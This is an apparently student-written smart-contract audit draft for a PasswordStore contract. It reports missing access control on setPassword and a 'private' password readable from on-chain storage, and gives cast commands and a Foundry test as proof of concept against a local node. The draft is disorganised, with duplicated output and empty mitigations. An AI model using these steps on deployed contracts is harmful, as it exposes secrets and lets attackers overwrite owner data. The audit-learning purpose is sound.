### [S-#] `PasswordStore::setPassword` lack of access control

**Description:** 
```javascript
    // @audit-issue no access control
    function setPassword(string memory newPassword) external {
        s_password = newPassword;
        emit SetNetPassword();
    }
```
**Impact:** ### [S-#] Private Data stored in storeage on chain HIGH (ROOT CAUSE + IMPACT)

**Description:** 
Contract `PasswordStore` stores private data onchain in `PasswordStore::s_password` private variable. Storing data that way will be visible for everone despite using `private` keyword. Contract should allow to retreive password only through `PasswordStore::getPassword()`.
**Impact:** 
High

**Proof of Concept:** (Proof of Code)
The below test case shows haow anyone can read the password directly from the blockchain. 

genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast storage 0x5fbdb2315678afecb367f032d93f642f64180aa3 1 --rpc-url http://127.0.0.1:8545
0x6d7950617373776f726400000000000000000000000000000000000000000014
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
myPassword
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ 

**Recommended Mitigation:** 
Whole architecure is to reconsider
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast storage 0x5fbdb2315678afecb367f032d93f642f64180aa3 1 --rpc-url http://127.0.0.1:8545
0x6d7950617373776f726400000000000000000000000000000000000000000014
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
myPassword
genesisglitch@genesisglitch:~/UPDRAFT/SEC/3-passwordstore-audit$ 


**Proof of Concept:**
<details>
```javascript
    function test_anyone_can_change_password(address randomAddress) public {
        attacker = randomAddress;
        vm.assume(attacker != owner);
        
        vm.startPrank(owner);
        string memory actualPassword = passwordStore.getPassword();
        console.log("V: ", actualPassword);
        vm.stopPrank();

        vm.startPrank(attacker);
        string memory attackedPassword = "attackedPassword";
        console.log("A: ", attackedPassword);
        passwordStore.setPassword(attackedPassword);
        vm.stopPrank();

        vm.prank(owner);
        assertNotEq(actualPassword, passwordStore.getPassword());
    }
```
</details>

**Recommended Mitigation:** 
